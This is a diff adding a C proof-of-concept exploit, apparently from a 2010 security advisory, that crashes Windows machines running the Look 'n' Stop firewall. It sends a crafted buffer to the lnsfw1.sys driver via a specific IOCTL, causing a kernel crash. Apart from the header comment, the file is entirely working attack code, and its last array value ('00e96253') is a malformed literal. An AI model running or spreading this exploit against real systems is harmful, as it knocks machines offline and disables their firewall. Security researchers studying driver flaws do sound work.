@@ -1,0 +1,101 @@
+#include <stdio.h>
+#include <windows.h>
+#include <winioctl.h>
+#include <stdlib.h>
+#include <string.h>
+
+/*
+Program          : Look 'n' Stop 2.06p4 / 2.07 (6.0.2900.5512)
+Homepage         : http://www.looknstop.com
+Discovery        : 2009/11/08
+Author Contacted : 2010/07/15 ... no reply
+Found by         : Heurs
+This Advisory    : Heurs
+Contact          : s.leberre@sysdream.com
+
+
+//----- Application description
+
+Look 'n' Stop Firewall 2.07 provides key features to protect your computer
+against cyber threats. It prevents malicious programs from transmitting the
+data of your computer to hacker's computers. Look 'n' Stop Firewall 2.07
+also protects your computer from external intrusions.
+
+//----- Description of vulnerability
+
+lnsfw1.sys driver generate a BSOD with particular value of IOCTL. Kernel wait
+an action with a kernel debugger.
+
+//----- Credits
+
+http://www.sysdream.com
+http://www.hackinparis.com/
+http://ghostsinthestack.org
+
+s.leberre at sysdream dot com
+heurs at ghostsinthestack dot org
+
+*/
+
+int __cdecl main(int argc, char* argv[])
+{
+    HANDLE hDevice = (HANDLE) 0xffffffff;
+    DWORD NombreByte;
+    DWORD Crashing[] = {
+        0x200ff822, 0xd24b37a1, 0x8ce055dc, 0x70b3d269,
+        0x3d2ef498, 0xcdd0e57c, 0xf2699fab, 0xed753dcb,
+        0xfdde2a99, 0x90590b61, 0x28011112, 0xeb35191c,
+        0x36f0e1e7, 0xef7ee764, 0x09b01e1f, 0x0bb86825,
+        0x1b886612, 0xd8c289df, 0xaa21ad45, 0x6fa7a76d,
+        0x13492a54, 0x7c2bc443, 0x65dbf582, 0xffeb86cc,
+        0xf48ca4fd, 0x75542bb5, 0xd05638ba, 0x3876e368,
+        0x678ba399, 0x6779f15c, 0x8f89ff55, 0xc8b9cf02,
+        0x033b9857, 0x82eef1a9, 0xf0dba3b6, 0xadf5b8f6,
+        0x033ef961, 0x393f043b, 0x515896fd, 0x28d10e25,
+        0x37b7f707, 0x1a425f92, 0x4bc6acfb, 0x45390605,
+        0x0be40107, 0xf121a706, 0x4b4c0e31, 0x88889f12,
+        0x0c60806d, 0x03af4569, 0xe5b68798, 0xb22bd966,
+        0xd532fe7f, 0x19a7213a, 0x6927f7f5, 0xcd4c3202,
+        0x96831f6b, 0x1d09991d, 0x48d1da67, 0x68f24415,
+        0xbb01a216, 0xdb6b634a, 0x18e36cb4, 0xcd7265c2,
+        0x64b81111, 0x4305d1b3, 0xc4f1ee8d, 0xfcd61343,
+        0xb8bfc8b9, 0x8a1a5541, 0xe9c3adcb, 0xca4c2a56,
+        0x89a67e7d, 0x74b8704e, 0xfe70e4d6, 0x27612082,
+        0xd8e211d7, 0x190ec39c, 0x380dfc09, 0x8d649b0c,
+        0xeda15e23, 0xe2e76319, 0xc781f249, 0x4cb25434,
+        0xeff3dc6a, 0xa0a6e976, 0x57014474, 0x98629b36,
+        0x2cc9fb9d, 0xa6a8b31b, 0xa3fbef44, 0xfeb130d3,
+        0x91e8c96b, 0xdc953762, 0x77341f7c, 0xd4ec9d26,
+        0x8504a663, 0x1da0406a, 0x8a049adf, 0x0f2ca8ef,
+        0xbc93ec1e, 0x027bdfad, 0x4c8885f6, 0x1c30be98,
+        0x0ec01493, 0x124d4252, 0x0765f8c1, 0x801652da,
+        0x778a6e6a, 0x09ef17aa, 0x6ece13fd, 0xa7280f9c,
+        0xcf6235f9, 0xabdeae81, 0x8145979e, 0x45af7871,
+        0xed3d36e0, 0x9e223b88, 0xfe26e7f2, 0xe13743f1,
+        0xa8171a6e, 0x611c303f, 0x252a68d2, 0xd013e026,
+        0x1259b868, 0xf673c420, 0x27a60840, 0xd87eed92,
+        0xef872203, 0x26868592, 0x18324bc9, 0xed47e068,
+        0xf2c0b162, 0x95966d8e, 0x07cc53db, 0xe8360489,
+        0x7c630b42, 0x8ab52dd9, 0xc5bf0c0e, 0xae8a8284,
+        0x97a0a5ab, 0x0cccb1c4, 0x4d768275, 0x1101e67e,
+        0x16e2f2c3, 0x82b7686a, 0x5b26314e, 0x52f74f38,
+        0xcb341107, 0xa59c70d0, 0x3327af19, 0xdd51188f,
+        0x54636221, 0xa05f288a, 0xeb7d4a3a, 0x2065885d,
+        0xb103190e, 0xd36e7e1e, 0xf7a7d560, 0xc62c828d,
+        0x9fc687e9, 0xcf609352, 00e96253
+        };
+    BYTE Out[0x20];
+    
+    printf("0day Local DoS - Look 'n' Stop 2.06p4\n\n");
+    hDevice = CreateFile("\\\\.\\LNSFW1",GENERIC_READ|GENERIC_WRITE,0,NULL,OPEN_EXISTING,0,NULL);
+    printf("%x\n",hDevice);
+    
+    DeviceIoControl(hDevice,0x80000064,Crashing,0x28b,0,0,&NombreByte,NULL);
+    
+    printf("Sploit Send.\n\n");
+    CloseHandle(hDevice);
+    getch();
+    return 0;
+}
+
+
